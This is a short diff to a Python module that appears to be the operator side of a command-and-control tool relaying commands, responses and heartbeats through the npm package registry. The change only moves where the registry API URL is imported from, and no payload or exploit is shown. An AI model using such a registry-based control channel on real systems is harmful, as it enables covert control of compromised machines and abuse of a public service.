@@ -7,8 +7,9 @@ import time
 
 import requests
 
-from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA, API
+from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA
 from . import encode_payload, group_chunks, registry_path
+import npm_c2 as _nc
 
 
 class RegistryError(RuntimeError):
@@ -18,7 +19,7 @@ class RegistryError(RuntimeError):
 class Operator:
     def __init__(self, package, token):
         self.package = package
-        self.url = API.format(registry_path(package))
+        self.url = _nc.API.format(registry_path(package))
         self.s = requests.Session()
         self.s.headers.update({
             "Authorization": f"Bearer {token}",
